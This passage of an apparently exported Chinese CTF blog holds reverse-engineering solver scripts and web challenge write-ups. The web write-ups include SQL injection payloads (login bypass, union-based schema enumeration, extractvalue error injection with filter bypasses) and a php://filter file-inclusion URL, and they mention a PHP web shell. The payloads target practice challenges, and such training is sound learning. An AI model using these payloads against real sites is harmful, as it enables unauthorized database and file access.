解异或加密的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>():</span></span><br><span class="line">    res = []</span><br><span class="line">    key = <span class="string">&#x27;Bier&#x27;</span></span><br><span class="line">    Cipher = <span class="string">&#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(Cipher),<span class="number">2</span>):</span><br><span class="line">        res.append(<span class="built_in">int</span>(Cipher[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(res)):</span><br><span class="line">        res[i] = res[i] ^ <span class="built_in">ord</span>(key[(i)%<span class="number">4</span>]) ^ res[i-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59]</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 位运算脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    BYTE byte[] = &#123; <span class="number">147</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">170</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">105</span>, <span class="number">139</span>, <span class="number">179</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">147</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">129</span>, <span class="number">155</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">131</span>, <span class="number">34</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">107</span>, <span class="number">59</span> &#125;;</span><br><span class="line">    BYTE index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> first = byte[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="number">147</span> &gt;&gt;<span class="number">3</span>)&amp;<span class="number">0xFF</span> | (<span class="number">59</span> &lt;&lt;<span class="number">5</span>)&amp;<span class="number">0xFF</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        BYTE x = (byte[i] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        BYTE y = (byte[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x | y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 交换位置</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span>():</span></span><br><span class="line">    flag = <span class="built_in">list</span>(<span class="string">&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;</span>)</span><br><span class="line">    index = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        num += <span class="number">0x11</span></span><br><span class="line">        num &amp;= <span class="number">0x1F</span></span><br><span class="line">        index.append(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">        flag[index[i]], flag[index[i+<span class="number">1</span>]] = flag[index[i+<span class="number">1</span>]], flag[index[i]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        <span class="built_in">print</span>(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><em>flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</em></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​        这道题过程不复杂，调用了SetUnhandledExceptionFilter，注册异常处理函数，通过C7这个非法指令触发异常，运行这个异常处理函数，从而进行加密操作</p><p>​        如果想动态调试的话可以直接改字节码（我只会这一种方法。。）不知道还有没有其他方法，但是做题的时候需要细心一点，因为汇编的一些过程没有看清导致浪费了我很多时间</p><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>我搞得最烦的一道题。。以前没有搞过带iv的AES，也从来没有看过sha256和md5的反编译代码，这次算是遇到了。。看了很久都没有看出来，最后看了别的师傅的wp才出来的。其实这道题知道了md5和sha256之后加密过程并不复杂，但是如果是第一次遇到那就恼火了（比如像我）</p><p>总共算下来这道题一共有5个步骤</p><ol><li><p>字符串转16进制</p><p>打个比方：比如我们输入123456，那么程序会将我们输入的转为 12 23 45这三个16进制数进行保存，因此前面只允许输入0-9 a-f的字符</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003234483.png" alt="image-20210205003234483"></p></li><li><p>位运算</p><p>总体向前移动了三位（我怀疑这次的题是一个人出的，加密算法都好相似。。）</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003456605.png"></p></li><li><p>计算key和iv</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003652039.png"></p></li><li><p>rc4和AES</p><p>注意AES是解密，题目用的是Res盒子，并不是常规的S盒子，所以我们写脚本的时候是加密</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205004416149.png"></p></li></ol><p>5.与用md5生成的序列比较</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205004520967.png"></p><p>如果序列号比对成功，程序就会读取flag.enc中的二进制数据，我们输入然后通过加密计算得到的序列号就会作为key解密flag.enc的二进制数据流，同样也是AES CBC模式，但是这部分不用我们关心，我们只需要得到正确的序列号就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES,ARC4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">string = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">new_res = [<span class="number">0x8c</span>]</span><br><span class="line"></span><br><span class="line">Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())</span><br><span class="line">digest = hashlib.sha256(string).hexdigest()</span><br><span class="line"></span><br><span class="line">res = [i <span class="keyword">for</span> i <span class="keyword">in</span> binascii.unhexlify(digest)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    new_res.append(res[i] ^ res[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># aes加密</span></span><br><span class="line">key = binascii.a2b_hex((<span class="built_in">bytes</span>(new_res).<span class="built_in">hex</span>()[:<span class="number">32</span>]).encode())</span><br><span class="line">iv = binascii.a2b_hex((<span class="built_in">bytes</span>(new_res).<span class="built_in">hex</span>()[<span class="number">32</span>:]).encode())</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">Cipher_AES = aes.encrypt(Plain_AES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rc4加密</span></span><br><span class="line">rc4_cipher = Cipher_AES</span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">rc4_plain = rc4.decrypt(rc4_cipher)</span><br><span class="line"><span class="built_in">print</span>(rc4_plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位运算</span></span><br><span class="line">big_num_hex = binascii.hexlify(rc4_plain)</span><br><span class="line">big_num_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(big_num_hex, <span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">16</span>*<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">big_num_bin = big_num_bin[<span class="number">3</span>:] + big_num_bin[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag += <span class="built_in">hex</span>(<span class="built_in">int</span>(big_num_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 653b987431e5a2fc7c3d748fba008869</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205005157181.png"></p><h3 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h3><ol><li>常见的加密算法特征不清楚（大问题）</li><li>看汇编不仔细（需要改掉自己粗心的毛病）</li><li>windows方面知识还是不够</li><li>题型见得太少了，感觉做了一道题就累的要死😑，真的佩服比赛从开始肝到最后的师傅们</li><li>学习了怎么使用Cryptdome库，windows的几种反调试（异常注册，debug bloker)，下次在遇到就不会这么痛苦了吧（大概）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h3 id=&quot;babyre&quot;&gt;&lt;a href=&quot;#babyre&quot; class=&quot;headerlink&quot; title=&quot;babyre&quot;&gt;&lt;/a&gt;babyre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.o</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>2019极客大挑战web</title>
    <link href="http://example.com/6345/"/>
    <id>http://example.com/6345/</id>
    <published>2021-07-14T04:44:17.040Z</published>
    <updated>2022-01-01T09:53:36.224Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码直接出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><ul><li><p>首先查出单引号报错</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212244339.png" style="zoom:67%;" /><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212257596.png"></p></li><li><p>尝试用万能密码登录，发现只是一个无用的值，CMD5网站也无法破解，尝试其他方法</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212341586.png" style="zoom: 67%;" /></li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212405252.png" style="zoom: 33%;" /><ul><li><p>尝试中断注入，联合注入查看其他信息可以看到用到了查询的第2，3个字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,3 #</span></span><br></pre></td></tr></table></figure><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212657106.png" style="zoom: 33%;" /></li><li><p>获取当前数据库名，回显出当前数据库名为<code>geek</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,database(),version() #</span></span><br></pre></td></tr></table></figure><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212841772.png"  style="zoom:33%;" /></li><li><p>查询数据库里面的表名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有表名</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;database_name&#x27;</span></span><br><span class="line"></span><br><span class="line"># 查询所有列名</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span> <span class="string">&#x27;表名&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span> <span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure><p>这里需要加上limit限制返回的列数，手工查出<code>geek</code>数据库下只有两个表：<code>geekuser</code>和<code>l0ve1ysq1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,table_name from information_schema.tables where table_schema = &#x27;</span>geek<span class="string">&#x27; limit 0,1 #</span></span><br></pre></td></tr></table></figure></li><li><p>查询表的列名，我当时是一个一个查的，看别人wp发现可以一次就全部查出来。。查出三个列名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span> <span class="string">&#x27;表名&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span> <span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401213635841.png" style="zoom:33%;" /></li><li><p>获取数据库中信息</p><p>我先是手工查，后面加了一个where语句条件就直接出了。。运气好，网上师傅wp都是把表中的数据全部荡下来。学习一手</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,username,password from l0ve1ysq1 where username = &#x27;</span>flag<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure><p>网上师傅的做法，对mysql中的函数一点都不熟悉，边sqli边学mysql函数吧。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1 #</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>考点：绕过特殊字符过滤</p><p>过滤了or,and,select,union,from这些关键字，用所有关键字用双写绕过，过程和LoveSQL过程一样</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>考点：SQL报错注入</p><p>过滤了空格，等号，union，and等字符，主要难点在于空格过滤绕过，需要用括号来绕过</p><ul><li><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(database()))))%23</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428215743886.png"></p></li><li><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428220751357.png"></p></li><li><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428221118649.png"></p></li><li><p>查flag</p><p>需要用left和right分别查左边和右边，然后个flag拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(left(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(right(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c36b7fc4-a9fe-4d02-97c6-d3c8b35ead69&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>SQL盲注</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>考点：本地文件包含，<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a></p><p>抓包抓到一个特殊文件，访问目录查看</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410170938938.png" style="zoom: 67%;" /><p>查看为本地文件包含，但是访问flag.php却什么也没有。使用php://filter协议对文件进行base64编码查看</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410171054700.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问后缀：secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><code>flag.php</code>中的内容全部以base64编码的形式输出，在线解码得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MWZkYzRlMDItODU1MS00ZTY3LThkNzUtZmY3ZDkzZDJmNjg5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410171524485.png"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>一句话木马，直接用蚁剑连接网站后台，<code>flag</code>在根目录</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410171850050.png" style="zoom:80%;" /><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>考察网站常用备份后缀名，PHP的序列化与反序列化</p><p>首先提示了网站备份，用常用的网站备份字典爆破，爆破出<code>www.zip</code>，在后缀输入下载</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>HTTP头部伪造，比较过程比较简单，主要是需要学习HTTP协议</p><p>/sbin/nologin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;极客大挑战-2019-EasySQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]EasySQL&quot;&gt;&lt;/a&gt;[极客大挑战</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>红明谷/虎符CTF-re题解</title>
    <link href="http://example.com/5429/"/>
    <id>http://example.com/5429/</id>
    <published>2021-07-14T04:44:17.040Z</published>
    <updated>2022-01-01T09:53:30.376Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="红明谷-g0"><a href="#红明谷-g0" class="headerlink" title="红明谷-g0"></a>红明谷-g0</h2><p>看名字就是go语言题目，用<code>IDA-golang-helper</code>还原符号表之后，看到只有几个函数，其中<code>main_Encode</code>就是加密函数</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210408210534162.png"></p><p>函数逻辑比较简单，输入长度等于20，打乱位置，进入<code>main_Encode</code>加密，最后进入<code>main_fun1</code>进行比较，直接看<code>main_Encode</code>中的加密算法</p><p>动态调试后发现一张表，表的长度为58位，判断为换表base58加密</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210408211106286.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210408211130873.png"></p><p>进入<code>main_fun1</code>函数中找到加密后的字符串，注意 <code>runtime_memequal</code>这个比较的函数需要在汇编中寻找比较的字符串首地址，在伪代码中是找不到的</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210408211846445.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">Cipher = <span class="string">&#x27;2GVdudkYo2CBXoQii7gfpkjTc4gT&#x27;</span></span><br><span class="line">Plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">new_table = <span class="string">&#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;</span></span><br><span class="line">old_table = <span class="string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Cipher)):</span><br><span class="line">    Plain += old_table[new_table.index(Cipher[i])]</span><br><span class="line"><span class="built_in">print</span>(base58.b58decode(Plain.encode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;We1CTFc0m_2345&#125;</span></span><br></pre></td></tr></table></figure><h2 id="虎符-re"><a href="#虎符-re" class="headerlink" title="虎符-re"></a>虎符-re</h2><p><code>mips</code>架构文件，本来想用<code>qemu</code>动态调试的，但是好像虚拟机的so文件出问题了，就静态分析算了，反正有<code>IDA7.5</code>不怕</p><p>看伪代码很浓厚的C++气息，两次判断，<code>pre</code>函数里面还判断了输入的长度</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210408213206822.png"></p><p><code>server_check_redemption_code</code>函数大概的意思就是生成一张宽256长和字符串长度相同的表，当表的列值与输入的字符串的ASCII值相同时就做一个标记，用C语言还原后的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 